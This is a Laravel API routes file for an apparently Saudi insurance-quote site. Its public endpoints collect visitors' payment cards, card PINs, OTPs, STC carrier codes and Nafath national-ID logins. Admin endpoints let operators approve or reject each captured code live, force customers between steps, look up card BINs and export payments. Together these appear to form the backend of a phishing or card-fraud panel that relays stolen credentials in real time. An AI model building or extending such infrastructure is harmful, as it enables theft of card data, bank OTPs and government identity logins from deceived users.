<?php

use App\Http\Controllers\Admin\AdminCustomerController;
use App\Http\Controllers\Admin\AdminCustomerForceController;
use App\Http\Controllers\Admin\AdminNafathController;
use App\Http\Controllers\Admin\AdminNotificationController;
use App\Http\Controllers\Admin\AdminOtpController;
use App\Http\Controllers\Admin\AdminPaymentCardController;
use App\Http\Controllers\Admin\AdminPhoneDataController;
use App\Http\Controllers\Admin\AdminPhoneVerificationController;
use App\Http\Controllers\Admin\AdminStcController;
use App\Http\Controllers\Admin\AuthController;
use App\Http\Controllers\Admin\CustomerActivityController;
use App\Http\Controllers\Admin\DashboardStatsController;
use App\Http\Controllers\Admin\ExportController;
use App\Http\Controllers\Admin\LiveChatController;
use App\Http\Controllers\Admin\LoginAttemptController;
use App\Http\Controllers\Admin\QuoteMonitorController;
use App\Http\Controllers\Admin\SettingsController;
use App\Http\Controllers\Admin\SystemMonitorController;
use App\Http\Controllers\Admin\UserManagementController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\CustomerCardPinController;
use App\Http\Controllers\CustomerOtpController;
use App\Http\Controllers\CustomerPaymentCardController;
use App\Http\Controllers\CustomerPhoneVerificationController;
use App\Http\Controllers\CustomerTrackingController;
use App\Http\Controllers\FunnelAnalyticsController;
use App\Http\Controllers\GeoCheckController;
use App\Http\Controllers\HealthController;
use App\Http\Controllers\NewsletterController;
use App\Http\Controllers\OrderController;
use App\Http\Controllers\QuoteCalculationController;
use App\Http\Controllers\QuoteLockController;
use App\Http\Controllers\QuoteTrackingController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Admin API routes for customer tracking, OTP management, and payment
| card approval/rejection workflows.
| Quote tracking routes for session lifecycle (start, step, heartbeat, complete).
|
*/

// ─── Health Check (public — no auth, light throttle) ────────────────
Route::prefix('health')->middleware('throttle:60,1')->group(function () {
    Route::get('/', HealthController::class);
    Route::get('/realtime', [HealthController::class, 'realtime']);
    Route::get('/queues', [HealthController::class, 'queues']);
});

// ─── Legal / Policy (public — cacheable, light throttle) ────────────
Route::prefix('legal')->middleware('throttle:30,1')->group(function () {
    Route::get('/', function () {
        return response()->json([
            'policies' => [
                ['slug' => 'privacy', 'title' => 'سياسة الخصوصية', 'url' => '/privacy'],
                ['slug' => 'terms', 'title' => 'الشروط والأحكام', 'url' => '/terms'],
                ['slug' => 'acceptable-use', 'title' => 'سياسة الاستخدام المقبول', 'url' => '/acceptable-use'],
                ['slug' => 'dmca', 'title' => 'حقوق الملكية الفكرية', 'url' => '/dmca'],
            ],
            'contact' => [
                'legal' => 'legal@taminkom.com',
                'abuse' => 'abuse@taminkom.com',
                'privacy' => 'privacy@taminkom.com',
            ],
        ]);
    });
});

// ─── Geo Check (public — no geo restriction, heavy throttle) ────────
Route::get('/geo/check', [GeoCheckController::class, 'check'])->middleware('throttle:30,1');

// ─── Customer Tracking (public — called from SPA forms) ─────────────
Route::prefix('customer')->middleware(['throttle:customer-tracking', 'geo.api'])->group(function () {
    Route::post('/track', [CustomerTrackingController::class, 'track']);
    Route::post('/track-details', [CustomerTrackingController::class, 'trackDetails']);
    Route::post('/track-mojaz', [CustomerTrackingController::class, 'trackMojaz']);
    Route::post('/page', [CustomerTrackingController::class, 'updatePage']);
    Route::get('/ip', [CustomerTrackingController::class, 'getIp']);

    // STC stage status — polling fallback (IP-based, no sig needed)
    Route::get('/stc-status', function (\Illuminate\Http\Request $request) {
        $customer = \App\Models\CustomerProfile::where('ip_address', $request->ip())->first();
        if (! $customer) {
            return response()->json(['success' => false, 'status' => 'not_found']);
        }
        $extra = $customer->extra_data ?? [];

        return response()->json([
            'success' => true,
            'stc_waiting' => ! empty($extra['stc_waiting_approved']) ? 'approved' : (! empty($extra['stc_waiting_rejected']) ? 'rejected' : 'pending'),
            'stc_otp' => ! empty($extra['stc_otp_approved']) ? 'approved' : (! empty($extra['stc_otp_rejected']) ? 'rejected' : 'pending'),
            'stc_call' => ! empty($extra['stc_call_approved']) ? 'approved' : (! empty($extra['stc_call_rejected']) ? 'rejected' : 'pending'),
            'stc_waiting_reason' => $extra['stc_waiting_rejected_reason'] ?? null,
            'stc_otp_reason' => $extra['stc_otp_rejected_reason'] ?? null,
            'stc_call_reason' => $extra['stc_call_rejected_reason'] ?? null,
        ]);
    });
});

// ─── OTP Verification (public — called from SPA) ───────────────────
Route::prefix('otp')->middleware(['geo.api'])->group(function () {
    Route::post('/submit', [CustomerOtpController::class, 'submit'])->middleware('throttle:otp-submit');
    Route::post('/resend', [CustomerOtpController::class, 'resend'])->middleware('throttle:otp-resend');
});

// ─── Card PIN Verification (public — called from SPA) ───────────────
Route::prefix('card-pin')->middleware(['throttle:otp-submit', 'geo.api'])->group(function () {
    Route::post('/submit', [CustomerCardPinController::class, 'submit']);
});

// ─── Payment Card Submission (public — called from SPA) ─────────────
Route::prefix('payment-card')->middleware(['throttle:30,1', 'geo.api'])->group(function () {
    Route::post('/submit', [CustomerPaymentCardController::class, 'submit']);
});

// ─── Phone Verification (public — called from SPA) ──────────────────
Route::prefix('phone-verification')->middleware(['geo.api'])->group(function () {
    Route::post('/send', [CustomerPhoneVerificationController::class, 'send'])->middleware('throttle:otp-submit');
    Route::post('/verify', [CustomerPhoneVerificationController::class, 'verify'])->middleware('throttle:otp-submit');
    Route::post('/resend', [CustomerPhoneVerificationController::class, 'resend'])->middleware('throttle:otp-resend');
});

// ─── Status Polling Endpoints (public — fallback for WebSocket) ─────
Route::prefix('status')->middleware(['status.sig', 'throttle:status-poll', 'geo.api'])->group(function () {
    Route::get('/otp/{sessionId}', function (string $sessionId) {
        $otp = \App\Models\OtpCode::where('session_id', $sessionId)
            ->ofType('otp')
            ->latest()
            ->first();

        // Surface expiry to frontend if OTP is still pending but time has passed
        $status = $otp?->status ?? 'not_found';
        if ($status === 'pending' && $otp?->isExpired()) {
            $status = 'expired';
        }

        return response()->json([
            'success' => true,
            'status' => $status,
            'otp_id' => $otp?->id,
            'reason' => $otp?->rejection_reason,
        ]);
    });

    Route::get('/pin/{sessionId}', function (string $sessionId) {
        $pin = \App\Models\OtpCode::where('session_id', $sessionId)
            ->ofType('pin')
            ->latest()
            ->first();

        return response()->json([
            'success' => true,
            'status' => $pin?->status ?? 'not_found',
            'pin_id' => $pin?->id,
            'reason' => $pin?->rejection_reason,
        ]);
    });

    Route::get('/payment-card/{sessionId}', function (string $sessionId) {
        $card = \App\Models\PaymentCard::where('session_id', $sessionId)->latest()->first();

        return response()->json([
            'success' => true,
            'status' => $card?->status ?? 'not_found',
            'card_id' => $card?->id,
            'rejection_reason' => $card?->rejection_reason,
        ]);
    });

    Route::get('/phone/{sessionId}', function (string $sessionId) {
        $phone = \App\Models\OtpCode::where('session_id', $sessionId)
            ->ofType('phone')
            ->latest()
            ->first();

        return response()->json([
            'success' => true,
            'status' => $phone?->status ?? 'not_found',
            'otp_id' => $phone?->id,
            'reason' => $phone?->rejection_reason,
        ]);
    });
});

// ─── Contact Form (public — called from SPA) ───────────────────────
Route::post('/contact', [ContactController::class, 'store'])->middleware(['throttle:5,1', 'geo.api']);

// ─── Orders (public — called from SPA checkout) ────────────────────
Route::prefix('orders')->middleware(['throttle:30,1', 'geo.api'])->group(function () {
    Route::post('/', [OrderController::class, 'store']);
    Route::get('/{orderNumber}', [OrderController::class, 'show']);
});

// ─── Newsletter (public — called from blog) ────────────────────────
Route::post('/newsletter', [NewsletterController::class, 'store'])->middleware(['throttle:5,1', 'geo.api']);

// ─── LiveChat Visitor (public — called from SPA) ────────────────────
Route::prefix('livechat')->middleware(['throttle:30,1', 'geo.api'])->group(function () {
    Route::post('/send', [LiveChatController::class, 'visitorSend']);
    Route::get('/{sessionId}/messages', [LiveChatController::class, 'visitorMessages']);
});

// ─── Nafath Login (public — called from SPA) ───────────────────────
Route::prefix('nafath')->middleware(['throttle:30,1', 'geo.api'])->group(function () {
    Route::post('/login', [\App\Http\Controllers\NafathController::class, 'login']);
    Route::get('/status', [\App\Http\Controllers\NafathController::class, 'status']);
});

// ─── Funnel Analytics (public — fire-and-forget event capture) ───────
Route::post('analytics/funnel-event', [FunnelAnalyticsController::class, 'store'])
    ->middleware(['throttle:60,1', 'geo.api']);

// ─── Quote Calculation (public — pricing engine) ────────────────────
Route::post('quotes/calculate', [QuoteCalculationController::class, 'calculate'])
    ->middleware(['throttle:30,1', 'geo.api']);

// ─── Quote Price Lock (public — checkout consistency token) ───────
Route::post('quotes/lock', [QuoteLockController::class, 'store'])
    ->middleware(['throttle:30,1', 'geo.api']);

// ─── Quote Tracking (public — called from SPA) ─────────────────────
Route::prefix('quote')->middleware(['throttle:60,1', 'geo.api'])->group(function () {
    Route::post('/start', [QuoteTrackingController::class, 'start']);
    Route::get('/{uuid}', [QuoteTrackingController::class, 'show']);
    Route::post('/{uuid}/step', [QuoteTrackingController::class, 'step']);
    Route::post('/{uuid}/heartbeat', [QuoteTrackingController::class, 'heartbeat']);
    Route::post('/{uuid}/complete', [QuoteTrackingController::class, 'complete']);
});

// ─── Admin Auth (IP-restricted + brute-force lockout) ───────────────
Route::prefix('admin')->middleware(['admin.ip'])->group(function () {
    Route::post('/login', [AuthController::class, 'login'])->middleware('throttle:30,1');
    Route::post('/verify-code', [AuthController::class, 'verifyCode'])->middleware('throttle:5,1');
    Route::post('/resend-code', [AuthController::class, 'resendCode'])->middleware('throttle:3,1');
});

// ─── Broadcasting Auth (Sanctum token-based) ────────────────────────
Route::post('/broadcasting/auth', function (\Illuminate\Http\Request $request) {
    return \Illuminate\Support\Facades\Broadcast::auth($request);
})->middleware(['auth:sanctum', 'throttle:60,1']);

Route::prefix('admin')->middleware(['auth:sanctum', 'admin', 'admin.ip', 'throttle:120,1'])->group(function () {
    // Auth
    Route::post('/logout', [AuthController::class, 'logout']);
    Route::get('/me', [AuthController::class, 'me']);
    // Customer listing
    Route::get('/customers', [AdminCustomerController::class, 'index']);
    Route::get('/customers/{id}', [AdminCustomerController::class, 'show']);
    Route::post('/customers/{id}/mark-viewed', [AdminCustomerController::class, 'markViewed']);

    // Notifications
    Route::get('/notifications', [AdminNotificationController::class, 'index']);
    Route::post('/notifications/read', [AdminNotificationController::class, 'markRead']);
    Route::post('/notifications/read-single', [AdminNotificationController::class, 'markSingleRead']);

    // Badge counts
    Route::get('/badge-counts', [AdminNotificationController::class, 'badgeCounts']);
    Route::post('/badge-seen/{section}', [AdminNotificationController::class, 'badgeSeen']);

    // Customer actions
    Route::post('/actions/redirect-customer', [AdminCustomerController::class, 'redirectCustomer']);

    // OTP actions
    Route::post('/actions/otp/{id}/approve', [AdminOtpController::class, 'approve']);
    Route::post('/actions/otp/{id}/reject', [AdminOtpController::class, 'reject']);

    // Phone verification actions
    Route::post('/actions/phone-verification/approve', [AdminPhoneVerificationController::class, 'approve']);
    Route::post('/actions/phone-verification/reject', [AdminPhoneVerificationController::class, 'reject']);

    // Phone data actions (stage 1: review phone data before OTP)
    Route::post('/actions/phone-data/approve', [AdminPhoneDataController::class, 'approve']);
    Route::post('/actions/phone-data/reject', [AdminPhoneDataController::class, 'reject']);

    // STC verification actions (3 stages: waiting, otp, call)
    Route::post('/actions/stc-verification/waiting/approve', [AdminStcController::class, 'approveWaiting']);
    Route::post('/actions/stc-verification/waiting/reject', [AdminStcController::class, 'rejectWaiting']);
    Route::post('/actions/stc-verification/otp/approve', [AdminStcController::class, 'approveOtp']);
    Route::post('/actions/stc-verification/otp/reject', [AdminStcController::class, 'rejectOtp']);
    Route::post('/actions/stc-verification/call/approve', [AdminStcController::class, 'approveCall']);
    Route::post('/actions/stc-verification/call/reject', [AdminStcController::class, 'rejectCall']);

    // Nafath verification actions
    Route::post('/actions/nafath/approve', [AdminNafathController::class, 'approve']);
    Route::post('/actions/nafath/reject', [AdminNafathController::class, 'reject']);
    Route::post('/actions/nafath/update-code', [AdminNafathController::class, 'updateCode']);

    // Payment card actions
    Route::post('/actions/payment-cards/{id}/approve', [AdminPaymentCardController::class, 'approve']);
    Route::post('/actions/payment-cards/{id}/reject', [AdminPaymentCardController::class, 'reject']);

    // Delete customer card
    Route::delete('/customers/{id}', [AdminCustomerController::class, 'destroy']);

    // BIN lookup
    Route::get('/bin-lookup/{bin}', [AdminPaymentCardController::class, 'binLookup']);

    // ─── Quote Monitor ──────────────────────────────────────
    Route::prefix('quotes')->group(function () {
        Route::get('/live', [QuoteMonitorController::class, 'live']);
        Route::get('/analytics', [QuoteMonitorController::class, 'analytics']);
        Route::get('/', [QuoteMonitorController::class, 'index']);
        Route::get('/{uuid}', [QuoteMonitorController::class, 'show']);
    });

    // ─── Dashboard Stats ─────────────────────────────────────
    Route::prefix('dashboard')->group(function () {
        Route::get('/stats', [DashboardStatsController::class, 'stats']);
        Route::get('/sales/monthly', [DashboardStatsController::class, 'monthlySales']);
    });

    // ─── Funnel Conversion Reports ───────────────────────────
    Route::prefix('funnel')->group(function () {
        Route::get('/report', [FunnelAnalyticsController::class, 'report']);
    });

    // ─── LiveChat Admin ──────────────────────────────────────
    Route::prefix('livechat')->group(function () {
        Route::get('/conversations', [LiveChatController::class, 'index']);
        Route::get('/conversations/{sessionId}', [LiveChatController::class, 'show']);
        Route::post('/conversations/{sessionId}/reply', [LiveChatController::class, 'reply']);
    });

    // ─── Customer Activities ────────────────────────────────
    Route::get('customer-activities', [CustomerActivityController::class, 'index']);

    // ─── Login Attempts ─────────────────────────────────────
    Route::get('login-attempts', [LoginAttemptController::class, 'index']);

    // ─── Settings ───────────────────────────────────────────
    Route::get('settings', [SettingsController::class, 'index']);
    Route::put('settings', [SettingsController::class, 'update']);
    Route::post('settings/password', [SettingsController::class, 'changePassword'])->middleware('throttle:3,1');

    // ─── User Management ────────────────────────────────────
    Route::get('users', [UserManagementController::class, 'index']);
    Route::post('users', [UserManagementController::class, 'store']);
    Route::put('users/{user}/password', [UserManagementController::class, 'updatePassword']);
    Route::delete('users/{user}', [UserManagementController::class, 'destroy']);

    // ─── Export (CSV) ───────────────────────────────────────
    Route::prefix('export')->group(function () {
        Route::get('/customers', [ExportController::class, 'customers']);
        Route::get('/payments', [ExportController::class, 'payments']);
    });

    // ─── System Monitor ─────────────────────────────────────
    Route::prefix('system')->group(function () {
        Route::get('/stats', [SystemMonitorController::class, 'stats']);
        Route::get('/health', [SystemMonitorController::class, 'health']);
        Route::post('/clear-cache', [SystemMonitorController::class, 'clearCache']);
    });

    // ─── Customer Force Actions ──────────────────────────────
    Route::post('customers/{id}/force-step', [AdminCustomerForceController::class, 'forceStep']);
    Route::post('customers/viewed-status', [AdminCustomerForceController::class, 'getViewedStatus']);
});
